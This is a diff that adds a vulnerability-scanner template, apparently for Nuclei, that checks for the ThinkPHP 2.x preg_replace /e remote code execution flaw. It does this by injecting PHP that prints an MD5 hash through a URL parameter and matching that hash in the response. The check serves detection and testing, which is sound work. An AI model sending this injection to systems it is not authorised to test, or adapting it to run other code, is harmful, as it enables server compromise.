@@ -1,0 +1,25 @@
+id: local-thinkphp-2x-rce
+
+info:
+  name: ThinkPHP 2.x preg_replace RCE
+  author: pentest-platform
+  severity: critical
+  description: |
+    ThinkPHP 2.x uses preg_replace with /e modifier for route matching,
+    allowing arbitrary PHP code execution via URL parameters.
+    Also affects ThinkPHP 3.0 Lite mode.
+  tags: safe-poc,thinkphp,rce,exploit
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/index/index/name/%24%7B%40print(md5(pentest2xrce))%7D"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "2ca2abe6c49a726e5770a35fb92c6eb9"
+      - type: status
+        status:
+          - 200
